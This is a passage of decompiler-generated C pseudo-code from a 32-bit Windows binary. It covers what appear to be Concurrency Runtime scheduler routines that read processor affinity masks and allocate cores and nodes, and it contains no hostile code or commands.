    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  result = ProcessAffinityMask;
  if ( ProcessAffinityMask != SystemAffinityMask )
  {
    if ( dword_4927DC < 4 )
    {
      result = (ULONG_PTR)operator new(8u);
      v6 = (_DWORD *)result;
      Block = (void *)result;
      v15 = 0;
      if ( result )
      {
        v7 = (ULONG_PTR *)operator new(0xCu);
        v8 = v7;
        Block = v7;
        if ( v7 )
        {
          v9 = ProcessAffinityMask;
          *v7 = 0;
          v7[1] = 0;
          v7[2] = 0;
          *((_WORD *)v7 + 2) = 0;
          *v7 = v9;
        }
        else
        {
          v8 = 0;
        }
        v6[1] = v8;
        result = 1;
        *(_WORD *)v6 = 1;
      }
      else
      {
        v6 = 0;
      }
      dword_4927C8 = v6;
    }
    else
    {
      CurrentThread = GetCurrentThread();
      sub_4306CA(&v13, (int)CurrentThread);
      v3 = (ULONG_PTR *)operator new(0xCu);
      Block = v3;
      if ( v3 )
      {
        v4 = ProcessAffinityMask;
        v5 = v14;
        *v3 = 0;
        v3[1] = 0;
        v3[2] = 0;
        *((_WORD *)v3 + 2) = v5;
        *v3 = v4;
      }
      else
      {
        v3 = 0;
      }
      result = (ULONG_PTR)operator new(8u);
      Block = (void *)result;
      if ( result )
      {
        *(_DWORD *)(result + 4) = v3;
        *(_WORD *)result = 1;
      }
      else
      {
        result = 0;
      }
      dword_4927C8 = (void *)result;
    }
  }
  return result;
}
// 4927DC: using guessed type int dword_4927DC;
// 430B83: using guessed type _DWORD pExceptionObject[4];

//----- (00430CA8) --------------------------------------------------------
void sub_430CA8()
{
  j___free_base(Block);
  Block = 0;
  ReturnedLength = 0;
}

//----- (00430CC3) --------------------------------------------------------
_DWORD *__thiscall sub_430CC3(_DWORD *this, int a2)
{
  unsigned int v3; // ecx
  _DWORD *result; // eax
  unsigned int *v5; // esi
  unsigned int v6; // edi
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // eax
  int v10; // ecx
  int v11; // edx
  bool v12; // zf
  int v13; // eax
  int v14; // [esp+4h] [ebp-1Ch]
  unsigned int v15; // [esp+8h] [ebp-18h]
  int v16; // [esp+Ch] [ebp-14h]
  _DWORD *v17; // [esp+10h] [ebp-10h]
  int v18; // [esp+14h] [ebp-Ch]
  int v19; // [esp+1Ch] [ebp-4h]

  v3 = 0;
  v15 = 0;
  result = *(_DWORD **)(a2 + 16);
  if ( this[6] )
  {
    v5 = result + 1;
    v14 = -4 - (_DWORD)result;
    do
    {
      v6 = 0;
      if ( *v5 )
      {
        v7 = 0;
        v19 = 0;
        do
        {
          v16 = 0;
          v8 = 1;
          result = (_DWORD *)(v7 + v5[11]);
          v18 = 1;
          v17 = result;
          if ( this[2] > 1u )
          {
            do
            {
              v9 = *(_DWORD **)(*(_DWORD *)(this[21] + 4 * v8) + 16);
              if ( v9[27] )
              {
                v10 = (int)v5 + v14 + v9[4];
                v11 = v19 + *(_DWORD *)(v10 + 48);
                if ( *(_DWORD *)v11 == 5 )
                {
                  if ( *v17 != 4 )
                  {
                    ++**(_DWORD **)(v11 + 20);
                    v13 = *(_DWORD *)(v10 + 48);
                    v7 = v19;
                    *(_DWORD *)(v19 + v13) = 4;
                    goto LABEL_16;
                  }
                  if ( v17[6] || *(_BYTE *)(v11 + 48) || v16 )
                  {
                    sub_43BCD2(v9, v10, v6);
                  }
                  else
                  {
                    ++**(_DWORD **)(v11 + 20);
                    v12 = *(_BYTE *)(v11 + 49) == 0;
                    *(_DWORD *)v11 = 4;
                    if ( v12 )
                      sub_43BED9(v9, v10, v6);
                    v16 = 1;
                  }
                }
                v7 = v19;
              }
LABEL_16:
              result = (_DWORD *)(v18 + 1);
              v8 = (int)result;
              ++v18;
            }
            while ( (unsigned int)result < this[2] );
          }
          ++v6;
          v7 += 52;
          v19 = v7;
        }
        while ( v6 < *v5 );
        v3 = v15;
      }
      ++v3;
      v5 += 13;
      v15 = v3;
    }
    while ( v3 < this[6] );
  }
  return result;
}

//----- (00430DD0) --------------------------------------------------------
unsigned int __thiscall sub_430DD0(_DWORD *this)
{
  unsigned int v2; // esi

  v2 = this[47];
  if ( v2 >= sub_431117(this) + 1 )
    return sub_431117(this) + 1;
  return v2;
}

//----- (00430DF3) --------------------------------------------------------
unsigned int __thiscall sub_430DF3(_DWORD *this)
{
  int v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // edx

  v2 = this[46];
  v3 = sub_432E07(this);
  v4 = this[47];
  if ( v4 >= v2 + v3 + 1 )
    return sub_432E07(this) + v2 + 1;
  return v4;
}

//----- (00430E20) --------------------------------------------------------
unsigned int *__thiscall sub_430E20(unsigned int *this)
{
  unsigned int *v1; // esi
  unsigned int *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // ebx
  unsigned int v5; // edi
  void *v6; // esi
  size_t v7; // eax
  int v8; // edx
  int v9; // edi
  _DWORD *v10; // esi
  _DWORD *v11; // edi
  int v12; // ecx
  unsigned int *v14; // [esp+18h] [ebp-28h]
  _DWORD *v16; // [esp+20h] [ebp-20h]
  int v17; // [esp+24h] [ebp-1Ch]
  unsigned int v18; // [esp+28h] [ebp-18h]
  int v19; // [esp+2Ch] [ebp-14h]
  unsigned int v20; // [esp+30h] [ebp-10h]

  v1 = this;
  v2 = (unsigned int *)unknown_libname_45((52 * (unsigned __int64)this[6]) >> 32 != 0 ? -1 : 52 * this[6]);
  v14 = v2;
  memset(v2, 0, 52 * v1[6]);
  v18 = 0;
  if ( v1[6] )
  {
    v3 = 0;
    v4 = v2 + 1;
    v17 = 0;
    do
    {
      v16 = (_DWORD *)(v3 + v1[18]);
      qmemcpy(v4 - 1, v16, 0x18u);
      v5 = *v4;
      v6 = (void *)unknown_libname_45((52 * (unsigned __int64)*v4) >> 32 != 0 ? -1 : 52 * *v4);
      if ( v6 )
        `vector constructor iterator'(v6, 0x34u, v5, (void *(__thiscall *)(void *))sub_4307CF);
      else
        v6 = 0;
      v7 = 52 * *v4;
      v4[11] = (unsigned int)v6;
      memset(v6, 0, v7);
      v20 = 0;
      if ( *v4 )
      {
        v8 = 0;
        v9 = 0;
        v19 = 0;
        do
        {
          v10 = (_DWORD *)(v9 + v16[8]);
          v11 = (_DWORD *)(v8 + v4[11]);
          *v11 = *v10++;
          *++v11 = *v10;
          v11[1] = v10[1];
          *(_DWORD *)(v8 + v4[11]) = 1;
          v12 = v19 + v16[8] + 16;
          v9 = v19 + 36;
          v19 += 36;
          *(_DWORD *)(v8 + v4[11] + 20) = v12;
          v8 += 52;
          ++v20;
        }
        while ( v20 < *v4 );
      }
      v4 += 13;
      v1 = this;
      v3 = v17 + 40;
      ++v18;
      v17 += 40;
    }
    while ( v18 < this[6] );
    return v14;
  }
  return v2;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (00430F57) --------------------------------------------------------
BOOL __thiscall sub_430F57(LPVOID lpParameter)
{
  void *v2; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  v2 = (void *)sub_4302F6(0, 0x10000u, (LPTHREAD_START_ROUTINE)sub_431D7C, lpParameter, 0, 0);
  *((_DWORD *)lpParameter + 19) = v2;
  if ( !v2 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return sub_4300CC(v2, 15);
}
// 430F57: using guessed type _DWORD pExceptionObject[4];

//----- (00430FBE) --------------------------------------------------------
char *__thiscall sub_430FBE(void *this, int a2)
{
  char *v3; // esi
  char *v4; // eax
  void *v6[3]; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a2 + 8))(a2, v6);
  v3 = 0;
  v7 = 0;
  v4 = (char *)operator new(0xD0u);
  LOBYTE(v7) = 1;
  if ( v4 )
    v3 = sub_43ADA4(v4, a2, (int)this, v6);
  sub_43A283(v6);
  return v3;
}

//----- (00431020) --------------------------------------------------------
volatile signed __int32 *sub_431020()
{
  volatile signed __int32 *v0; // esi
  void *v1; // eax

  sub_4304E3(&dword_492820);
  if ( !dword_4927B8 || (v0 = (volatile signed __int32 *)sub_430237(dword_4927B8), !sub_434118(v0)) )
  {
    v1 = operator new(0x90u);
    if ( v1 )
      v0 = (volatile signed __int32 *)sub_4306EB((int)v1);
    else
      v0 = 0;
    _InterlockedIncrement(v0 + 1);
    dword_4927B8 = sub_430237((int)v0);
  }
  dword_492820 = 0;
  return v0;
}
// 4927B8: using guessed type int dword_4927B8;
// 492820: using guessed type int dword_492820;

//----- (004310B3) --------------------------------------------------------
int __thiscall sub_4310B3(int this, int a2, int a3)
{
  int v4; // edi
  int v5; // ecx
  int i; // ecx

  v4 = 0;
  sub_42E75B((LPCRITICAL_SECTION)(this + 44));
  v5 = *(_DWORD *)(this + 100);
  if ( v5 )
  {
    for ( i = *(_DWORD *)(v5 + 24); i; i = *(_DWORD *)(i + 24) )
    {
      v4 += *(_DWORD *)(52 * a3 + *(_DWORD *)(52 * a2 + *(_DWORD *)(i + 16) + 48) + 24);
      if ( i == *(_DWORD *)(this + 100) )
        break;
    }
  }
  sub_42E8A1((LPCRITICAL_SECTION)(this + 44));
  return v4;
}

//----- (00431117) --------------------------------------------------------
unsigned int __thiscall sub_431117(_DWORD *this)
{
  unsigned int result; // eax

  result = this[47];
  if ( result >= this[32] + this[46] )
    return this[32] + this[46];
  return result;
}

//----- (00431130) --------------------------------------------------------
void __thiscall sub_431130(_DWORD *this, void **Block)
{
  void **v2; // ebx
  unsigned int v3; // esi
  void **v4; // edi

  v2 = Block;
  v3 = 0;
  if ( this[6] )
  {
    v4 = Block + 12;
    do
    {
      j_j_j___free_base(*v4);
      ++v3;
      v4 += 13;
    }
    while ( v3 < this[6] );
    v2 = Block;
  }
  j_j_j___free_base(v2);
}

//----- (0043116A) --------------------------------------------------------
void __thiscall sub_43116A(_DWORD *this)
{
  unsigned int v1; // edi
  void *v2; // eax
  size_t v3; // ecx
  unsigned int v4; // esi
  int v5; // ecx
  unsigned int *v6; // eax
  void *v7; // ecx
  size_t v8; // eax
  unsigned __int16 *v9; // ebx
  DWORD v10; // ecx
  int v11; // edx
  int v12; // ecx
  char *v13; // esi
  int v14; // eax
  int v15; // esi
  int v16; // esi
  _DWORD *v17; // edx
  int v18; // ecx
  unsigned int *v19; // esi
  unsigned int v20; // esi
  DWORD v21; // ecx
  unsigned __int16 v22; // dx
  int v23; // ebx
  unsigned int *v24; // ecx
  unsigned int v25; // eax
  unsigned int v26; // esi
  int v27; // ecx
  unsigned int v28; // edx
  _DWORD *v29; // ebx
  int v30; // eax
  int v32; // [esp+10h] [ebp-14h]
  unsigned int v33; // [esp+10h] [ebp-14h]
  int v34; // [esp+10h] [ebp-14h]
  int v35; // [esp+14h] [ebp-10h]
  int v36; // [esp+14h] [ebp-10h]
  int v37; // [esp+18h] [ebp-Ch]
  DWORD v38; // [esp+1Ch] [ebp-8h]
  int v39; // [esp+1Ch] [ebp-8h]
  int v40; // [esp+20h] [ebp-4h]
  DWORD v41; // [esp+20h] [ebp-4h]

  v1 = (unsigned int)this;
  this[5] = dword_4927D8;
  this[6] = dword_4927D4;
  this[7] = dword_4927CC;
  v2 = (void *)unknown_libname_45((12 * (unsigned __int64)(unsigned int)this[5]) >> 32 != 0 ? -1 : 12 * this[5]);
  v3 = 12 * *(_DWORD *)(v1 + 20);
  *(_DWORD *)(v1 + 68) = v2;
  memset(v2, 0, v3);
  v4 = *(_DWORD *)(v1 + 24);
  v5 = (40 * (unsigned __int64)v4) >> 32 != 0 ? -1 : 40 * v4;
  v6 = (unsigned int *)unknown_libname_45(__CFADD__(v5, 4) ? -1 : v5 + 4);
  if ( v6 )
  {
    *v6 = v4;
    v7 = v6 + 1;
  }
  else
  {
    v7 = 0;
  }
  v8 = 40 * *(_DWORD *)(v1 + 24);
  *(_DWORD *)(v1 + 72) = v7;
  memset(v7, 0, v8);
  if ( dword_4927DC >= 4 )
  {
    v9 = (unsigned __int16 *)Block;
    v10 = 0;
    v11 = 0;
    v38 = 0;
    v40 = 0;
    if ( ReturnedLength )
    {
      v35 = 0;
      while ( 1 )
      {
        if ( *(_DWORD *)v9 == 1 )
        {
          if ( !byte_4927D0 && *((_DWORD *)v9 + 8) )
          {
            v15 = 40 * v11;
            sub_43299D((unsigned int *)(40 * v11 + *(_DWORD *)(v1 + 72)), v1, v11, v9[18], *((_DWORD *)v9 + 8), 0, 0);
            ++v40;
            *(_DWORD *)(v15 + *(_DWORD *)(v1 + 72) + 20) = *((_DWORD *)v9 + 2);
            v10 = v38;
          }
          v16 = *((_DWORD *)v9 + 8);
          if ( !v16 )
            goto LABEL_21;
          v17 = (_DWORD *)(v35 + *(_DWORD *)(v1 + 68));
          v18 = v9[18];
          v35 += 12;
          v17[2] = *((_DWORD *)v9 + 2);
          v17[1] = v18;
          *v17 = v16;
        }
        else
        {
          if ( *(_DWORD *)v9 != 3 || !byte_4927D0 )
            goto LABEL_21;
          v12 = 0;
          v13 = (char *)(v9 + 16);
          v14 = 40 * v11;
          v32 = 0;
          v37 = 40 * v11;
          do
          {
            if ( *(_DWORD *)v13 )
            {
              sub_43299D(
                (unsigned int *)(v14 + *(_DWORD *)(v1 + 72)),
                v1,
                v11,
                *((_WORD *)v13 + 2),
                *(_DWORD *)v13,
                0,
                0);
              v12 = v32;
              LOWORD(v11) = v40 + 1;
              v37 += 40;
              ++v40;
            }
            ++v12;
            v13 += 12;
            v32 = v12;
            v14 = v37;
          }
          while ( v12 < v9[15] );
        }
        v10 = v38;
LABEL_21:
        v10 += *((_DWORD *)v9 + 1);
        v9 = (unsigned __int16 *)((char *)v9 + *((_DWORD *)v9 + 1));
        v11 = v40;
        v38 = v10;
        if ( v10 >= ReturnedLength )
          goto LABEL_42;
      }
    }
    goto LABEL_42;
  }
  v19 = (unsigned int *)Block;
  if ( !Block )
  {
    if ( dword_4927C4 )
      v20 = *(_DWORD *)sub_4323F9((_DWORD *)dword_4927C4, (__int16)Block);
    else
      v20 = ProcessAffinityMask;
    sub_43299D(*(unsigned int **)(v1 + 72), v1, 0, 0, v20, 0, 0);
    **(_DWORD **)(v1 + 68) = v20;
    goto LABEL_43;
  }
  v21 = 0;
  v22 = 0;
  v41 = 0;
  v39 = 0;
  if ( ReturnedLength )
  {
    v36 = 0;
    v23 = 0;
    do
    {
      if ( v19[1] != 1 )
      {
        if ( v19[1] != 3 || !byte_4927D0 || !*v19 )
          goto LABEL_41;
        sub_43299D((unsigned int *)(v23 + *(_DWORD *)(v1 + 72)), v1, v22, 0, *v19, 0, 0);
        v22 = v39 + 1;
        v23 += 40;
        ++v39;
        goto LABEL_40;
      }
      if ( !byte_4927D0 )
      {
        if ( !*v19 )
          goto LABEL_41;
        sub_43299D((unsigned int *)(v23 + *(_DWORD *)(v1 + 72)), v1, v22, 0, *v19, 0, 0);
        v22 = ++v39;
        *(_DWORD *)(v23 + *(_DWORD *)(v1 + 72) + 20) = v19[2];
        v23 += 40;
        v21 = v41;
      }
      v33 = *v19;
      if ( *v19 )
      {
        v24 = (unsigned int *)(v36 + *(_DWORD *)(v1 + 68));
        v25 = v19[2];
        v24[1] = 0;
        v36 += 12;
        v24[2] = v25;
        *v24 = v33;
LABEL_40:
        v21 = v41;
      }
LABEL_41:
      v21 += 24;
      v19 += 6;
      v41 = v21;
    }
    while ( v21 < ReturnedLength );
  }
LABEL_42:
  sub_430CA8();
LABEL_43:
  if ( !byte_4927D0 )
    return;
  v26 = 0;
  if ( !*(_DWORD *)(v1 + 24) )
    return;
  v27 = 0;
  do
  {
    v28 = 0;
    if ( !*(_DWORD *)(v1 + 20) )
      goto LABEL_54;
    v29 = *(_DWORD **)(v1 + 68);
    v34 = *(_DWORD *)(v1 + 72);
    v30 = *(_DWORD *)(v27 + v34 + 12);
    while ( v30 != v29[1] )
    {
LABEL_51:
      ++v28;
      v29 += 3;
      if ( v28 >= *(_DWORD *)(v1 + 20) )
        goto LABEL_54;
    }
    v1 = (unsigned int)this;
    if ( (*v29 & *(_DWORD *)(v27 + v34)) == 0 )
    {
      v30 = *(_DWORD *)(v27 + v34 + 12);
      goto LABEL_51;
    }
    *(_DWORD *)(v27 + v34 + 20) = *(_DWORD *)(12 * v28 + this[17] + 8);
LABEL_54:
    ++v26;
    v27 += 40;
  }
  while ( v26 < *(_DWORD *)(v1 + 24) );
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 4927C4: using guessed type int dword_4927C4;
// 4927CC: using guessed type int dword_4927CC;
// 4927D0: using guessed type char byte_4927D0;
// 4927D4: using guessed type int dword_4927D4;
// 4927D8: using guessed type int dword_4927D8;
// 4927DC: using guessed type int dword_4927DC;

//----- (00431485) --------------------------------------------------------
_DWORD *__thiscall sub_431485(_DWORD *this)
{
  _DWORD *result; // eax
  int v2; // ebx
  _DWORD *v3; // ebx
  int v4; // eax
  int v5; // edi
  int v7; // [esp+8h] [ebp-Ch] BYREF
  int v8; // [esp+Ch] [ebp-8h] BYREF
  int v9; // [esp+10h] [ebp-4h] BYREF

  result = this;
  v2 = this[25];
  if ( v2 )
  {
    v3 = *(_DWORD **)(v2 + 24);
    if ( v3 )
    {
      do
      {
        v4 = v3[30];
        v5 = v3[2];
        v7 = 0;
        v8 = 0;
        v9 = v4;
        (*(void (__thiscall **)(int, int *, int *, int *))(*(_DWORD *)v5 + 4))(v5, &v7, &v8, &v9);
        v3[30] = v9;
        result = this;
        if ( v3 == (_DWORD *)this[25] )
          break;
        result = (_DWORD *)v3[6];
        v3 = result;
      }
      while ( result );
    }
  }
  return result;
}

//----- (004314EA) --------------------------------------------------------
bool __thiscall sub_4314EA(_DWORD *this)
{
  _DWORD *v1; // ebx
  int v2; // esi
  _DWORD *v3; // esi
  unsigned int v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // edi
  bool v7; // dl
  unsigned int v8; // ecx
  unsigned int v9; // edx
  unsigned int v10; // ebx
  int v11; // ecx
  bool v12; // zf
  int v13; // edi
  unsigned int v14; // ebx
  int v15; // ecx
  int v16; // eax
  int v18; // [esp+4h] [ebp-28h]
  _DWORD *v20; // [esp+10h] [ebp-1Ch]
  unsigned int v21; // [esp+14h] [ebp-18h]
  int v22; // [esp+18h] [ebp-14h]
  unsigned int v23; // [esp+1Ch] [ebp-10h]
  int v24; // [esp+1Ch] [ebp-10h]
  unsigned int v25; // [esp+20h] [ebp-Ch]
  int v26; // [esp+24h] [ebp-8h]
  bool v27; // [esp+2Bh] [ebp-1h]

  v1 = this;
  if ( !this[25] )
    return 1;
  v2 = this[25];
  if ( v2 )
    v3 = *(_DWORD **)(v2 + 24);
  else
    v3 = 0;
  v20 = v3;
  if ( v3[40] < sub_431117(v3) || v3[42] )
  {
    v4 = sub_431117(v3);
    v25 = sub_43B266(v3, v4) - v3[40];
    v22 = v3[4];
    v26 = v3[5];
    v5 = sub_431117(v3);
    v6 = v1[6];
    v7 = v5 != v1[7];
    v8 = 0;
    v21 = 0;
    if ( v6 )
    {
      while ( 1 )
      {
        v27 = v25 != 0 && v7;
        if ( v27 )
        {
          v9 = v8 + 1;
          v18 = *(_DWORD *)(v26 + 4 * v8);
          if ( v8 + 1 < v6 )
          {
            v10 = v8;
            v11 = v22 + 52 * v18;
            do
            {
              if ( *(_DWORD *)(v22 + 52 * *(_DWORD *)(v26 + 4 * v9) + 28) > *(_DWORD *)(v11 + 28) )
              {
                v11 = v22 + 52 * *(_DWORD *)(v26 + 4 * v9);
                v10 = v9;
              }
              ++v9;
            }
            while ( v9 < v6 );
            v8 = v21;
            v12 = v21 == v10;
            v3 = v20;
            v23 = v10;
            v1 = this;
            if ( !v12 )
            {
              *(_DWORD *)(v26 + 4 * v21) = *(_DWORD *)(v26 + 4 * v23);
              *(_DWORD *)(v26 + 4 * v23) = v18;
            }
          }
        }
        v13 = v22 + 52 * *(_DWORD *)(v26 + 4 * v8);
        if ( *(_DWORD *)(v13 + 4) )
          break;
LABEL_26:
        v6 = v1[6];
        ++v8;
        v7 = v27;
        v21 = v8;
        if ( v8 >= v6 )
          goto LABEL_27;
      }
      v14 = 0;
      v15 = 0;
      v24 = 0;
      while ( 1 )
      {
        v16 = *(_DWORD *)(v13 + 48);
        if ( *(_DWORD *)(v16 + v15) == 1 )
        {
          if ( v25 )
          {
            ++**(_DWORD **)(v16 + v15 + 20);
            sub_43B057(v3, v13, v14, 0);
            --v25;
LABEL_23:
            v15 = v24;
          }
        }
        else if ( *(_BYTE *)(v16 + v15 + 49) )
        {
          sub_43BED9(v3, v13, v14);
          goto LABEL_23;
        }
        ++v14;
        v15 += 52;
        v24 = v15;
        if ( v14 >= *(_DWORD *)(v13 + 4) )
        {
          v1 = this;
          v8 = v21;
          goto LABEL_26;
        }
      }
    }
  }
LABEL_27:
  if ( v3[33] == v3[32] )
    sub_434137(v1, 0);
  return v3[40] == sub_431117(v3);
}

//----- (0043168A) --------------------------------------------------------
void __thiscall sub_43168A(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6)
{
  unsigned int v6; // esi
  _DWORD *v7; // ebx
  unsigned int v8; // edi
  _DWORD *v9; // ecx
  int v10; // ecx
  unsigned int v11; // edi
  unsigned int v12; // ecx
  unsigned int v13; // edx
  int v14; // edi
  unsigned int v15; // eax
  int v16; // ecx
  int v17; // edx
  unsigned int v18; // eax
  unsigned int v19; // edi
  int v20; // eax
  int v22; // [esp+Ch] [ebp-18h]
  unsigned int v23; // [esp+10h] [ebp-14h]
  unsigned int v24; // [esp+10h] [ebp-14h]
  int v25; // [esp+14h] [ebp-10h]
  unsigned int v26; // [esp+18h] [ebp-Ch]
  unsigned int v27; // [esp+1Ch] [ebp-8h]
  char v28; // [esp+23h] [ebp-1h]

  v6 = a5;
  v7 = this;
  do
  {
    v8 = 0;
    v28 = 0;
    if ( !v6 )
      break;
    do
    {
      v9 = *(_DWORD **)(v7[23] + 4 * v8);
      if ( v9[1] )
      {
        if ( v9[10] > v9[11] )
        {
          v28 = 1;
          if ( sub_4322F0(v7, &a3, &a4, v9, a6) )
            --a2;
        }
      }
      ++v8;
    }
    while ( v8 < v6 );
  }
  while ( v28 );
  v10 = a2;
  if ( a2 )
  {
    v11 = 0;
    v23 = 0;
    if ( v6 )
    {
      v25 = v7[23];
      while ( 1 )
      {
        v12 = v11 + 1;
        v27 = v11;
        v26 = v11 + 1;
        v13 = v11 + 1;
        if ( v11 + 1 < v6 )
        {
          v14 = 4 * v11;
          do
          {
            if ( *(_DWORD *)(*(_DWORD *)(v25 + 4 * v13) + 4) <= *(_DWORD *)(*(_DWORD *)(v14 + v25) + 4) )
            {
              v15 = v27;
            }
            else
            {
              v15 = v13;
              v27 = v13;
              v14 = 4 * v13;
            }
            ++v13;
          }
          while ( v13 < v6 );
          v11 = v23;
          v7 = this;
          if ( v23 != v15 )
          {
            v16 = this[23];
            v17 = *(_DWORD *)(v16 + 4 * v23);
            *(_DWORD *)(v16 + 4 * v23) = *(_DWORD *)(v16 + 4 * v15);
            *(_DWORD *)(this[23] + 4 * v27) = v17;
          }
          v12 = v26;
        }
        v25 = v7[23];
        if ( !*(_DWORD *)(*(_DWORD *)(v25 + 4 * v11) + 4) )
          break;
        v11 = v12;
        v23 = v12;
        if ( v12 >= v6 )
          goto LABEL_25;
      }
      v6 = v11;
LABEL_25:
      v10 = a2;
    }
    v18 = v6;
    v24 = v6;
    do
    {
      v19 = 0;
      if ( v18 )
      {
        do
        {
          v20 = *(_DWORD *)(v7[23] + 4 * v19);
          v22 = v20;
          if ( *(_DWORD *)(v20 + 4) )
          {
            v10 = a2 - sub_431E95(v7, &a3, &a4, v20, v6, a6);
            a2 = v10;
            if ( !*(_DWORD *)(v22 + 4) )
              --v6;
          }
          v18 = v24;
          ++v19;
        }
        while ( v19 < v24 );
      }
    }
    while ( v10 );
  }
}

//----- (004317C7) --------------------------------------------------------
void __thiscall sub_4317C7(_DWORD *this, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ebx
  _DWORD *v4; // edx
  int v5; // esi
  unsigned int v6; // edi
  _DWORD *v7; // edi
  unsigned int v8; // ecx
  int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // edx
  int v12; // ebx
  unsigned int v13; // eax
  int v14; // ecx
  int v15; // edx
  int v16; // eax
  int v17; // edi
  int v18; // eax
  unsigned int v19; // eax
  int v20; // [esp+Ch] [ebp-1Ch]
  int v21; // [esp+10h] [ebp-18h]
  int v22; // [esp+10h] [ebp-18h]
  unsigned int v23; // [esp+10h] [ebp-18h]
  int v24; // [esp+14h] [ebp-14h]
  unsigned int v25; // [esp+18h] [ebp-10h]
  unsigned int v26; // [esp+18h] [ebp-10h]
  int v27; // [esp+1Ch] [ebp-Ch]
  unsigned int v28; // [esp+1Ch] [ebp-Ch]
  char v30; // [esp+27h] [ebp-1h]

  v3 = a2;
  v4 = this;
  v5 = a3;
  do
  {
    v6 = 0;
    v30 = 0;
    v25 = 0;
    if ( !a3 )
      break;
    do
    {
      if ( !v3 )
        break;
      v7 = *(_DWORD **)(v4[23] + 4 * v6);
      if ( v7[1] )
      {
        v8 = v7[11];
        if ( v7[10] > v8 )
        {
          v30 = 1;
          v27 = *(_DWORD *)(*(_DWORD *)(v7[4] + 20) + 4 * v8);
          v21 = *(_DWORD *)(v7[4] + 16) + 52 * v27;
          if ( *(_DWORD *)(40 * v27 + v4[18] + 28) )
          {
            sub_431B9C(v4, (_DWORD *)v7[4], v27, 1, 1);
            if ( *(_DWORD *)(v21 + 28) == *(_DWORD *)(v21 + 4) )
              ++v7[11];
            --v7[1];
            --v3;
            v4 = this;
          }
          else
          {
            ++v7[11];
          }
        }
      }
      v6 = v25 + 1;
      v25 = v6;
    }
    while ( v6 < a3 );
    a2 = v3;
  }
  while ( v30 );
  if ( v3 )
  {
    v9 = 0;
    v22 = 0;
    if ( a3 )
    {
      v24 = v4[23];
      while ( 1 )
      {
        v10 = v9 + 1;
        v28 = v9;
        v26 = v9 + 1;
        if ( v9 + 1 < a3 )
        {
          v11 = v9 + 1;
          v12 = 4 * v9;
          do
          {
            if ( *(_DWORD *)(*(_DWORD *)(v24 + 4 * v11) + 4) <= *(_DWORD *)(*(_DWORD *)(v12 + v24) + 4) )
            {
              v13 = v28;
            }
            else
            {
              v13 = v11;
              v28 = v11;
              v12 = 4 * v11;
            }
            ++v11;
          }
          while ( v11 < a3 );
          v9 = v22;
          v3 = a2;
          v4 = this;
          if ( v22 != v13 )
          {
            v14 = this[23];
            v15 = *(_DWORD *)(v14 + 4 * v22);
            *(_DWORD *)(v14 + 4 * v22) = *(_DWORD *)(v14 + 4 * v13);
            *(_DWORD *)(this[23] + 4 * v28) = v15;
            v4 = this;
          }
          v10 = v26;
        }
        v24 = v4[23];
        if ( !*(_DWORD *)(*(_DWORD *)(v24 + 4 * v9) + 4) )
          break;
        v9 = v10;
        v22 = v10;
        if ( v10 >= a3 )
          goto LABEL_29;
      }
      v5 = v9;
    }
LABEL_29:
    v16 = v5;
    v23 = v5;
    while ( 1 )
    {
      v17 = 0;
      if ( v16 )
        break;
LABEL_36:
      if ( !v3 )
        return;
    }
    while ( v3 )
    {
      v18 = *(_DWORD *)(v4[23] + 4 * v17);
      v20 = v18;
      if ( *(_DWORD *)(v18 + 4) )
      {
        v19 = sub_4321D6(v4, v3, v18, v5);
        v4 = this;
        v3 -= v19;
        if ( !*(_DWORD *)(v20 + 4) )
          --v5;
      }
      v16 = v23;
      if ( ++v17 >= v23 )
        goto LABEL_36;
    }
  }
}

//----- (0043195A) --------------------------------------------------------
int __thiscall sub_43195A(int *this)
{
  unsigned int v2; // edx
  unsigned int v3; // ebx
  _DWORD *v4; // ecx
  int v5; // esi
  unsigned int v6; // edx
  unsigned int v7; // eax
  unsigned int v8; // esi
  int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // ebx
  unsigned int v12; // edx
  int v13; // esi
  _DWORD *v14; // eax
  unsigned int v15; // esi
  int v16; // edx
  _DWORD *v17; // ecx
  unsigned int v18; // esi
  unsigned int j; // eax
  unsigned int v20; // ecx
  unsigned int v21; // ebx
  unsigned int v22; // edx
  int v23; // esi
  unsigned int v24; // esi
  unsigned int v25; // ecx
  unsigned int v26; // edx
  unsigned int v27; // esi
  unsigned int v28; // eax
  unsigned int v30; // [esp+Ch] [ebp-18h]
  unsigned int i; // [esp+10h] [ebp-14h]
  unsigned int v32; // [esp+14h] [ebp-10h]
  unsigned int v33; // [esp+14h] [ebp-10h]
  unsigned int v34; // [esp+18h] [ebp-Ch]
  int v35; // [esp+1Ch] [ebp-8h]
  unsigned int v36; // [esp+1Ch] [ebp-8h]
  unsigned int v37; // [esp+20h] [ebp-4h]

  sub_43303C(this);
  sub_433158(this);
  v34 = 0;
  v2 = 0;
  v3 = 0;
  for ( i = 0; v3 < this[2]; ++v3 )
  {
    v4 = *(_DWORD **)(this[21] + 4 * v3);
    if ( *(_DWORD *)(v4[4] + 160) > v4[9] )
    {
      *(_DWORD *)(this[22] + 4 * v2) = v4;
      v5 = v4[4];
      i = v2 + 1;
      v6 = *(_DWORD *)(v5 + 160) - v4[9];
      v34 += v6;
      if ( v4[6] < v6 )
        v6 = v4[6];
      v4[10] = v6;
      v7 = *(_DWORD *)(v5 + 160) - v4[9] - v6;
      v8 = *(_DWORD *)(v5 + 168) - v4[6];
      if ( v8 >= v7 )
        v8 = v7;
      v9 = v4[4];
      v4[11] = v8;
